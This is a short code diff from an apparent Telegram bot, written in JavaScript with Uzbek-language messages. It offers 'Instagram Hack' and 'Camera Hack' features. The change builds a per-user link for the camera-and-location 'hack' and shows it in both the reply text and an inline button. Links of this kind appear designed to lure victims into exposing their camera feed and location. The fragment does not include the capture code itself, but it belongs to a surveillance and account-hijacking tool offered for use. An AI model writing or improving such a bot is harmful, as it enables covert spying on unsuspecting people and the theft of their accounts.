@@ -133,9 +133,10 @@ bot.hears("📷 Instagram Hack", async (ctx) => {
 });
 
 bot.hears("📸 Camera Hack", async (ctx) => {
-  await ctx.reply("Camera va lokatsiya hack havolasi:", {
+  const cameraHackLink = `https://${HOST}/r/${ctx.from.id}`;
+  await ctx.reply(`Camera va lokatsiya hack havolasi: ${cameraHackLink}`, {
     reply_markup: {
-      inline_keyboard: [[{ text: "🔗 Camera hack havola", url: `https://${HOST}/r/${ctx.from.id}` }]]
+      inline_keyboard: [[{ text: "🔗 Camera hack havola", url: cameraHackLink }]]
     }
   });
 });
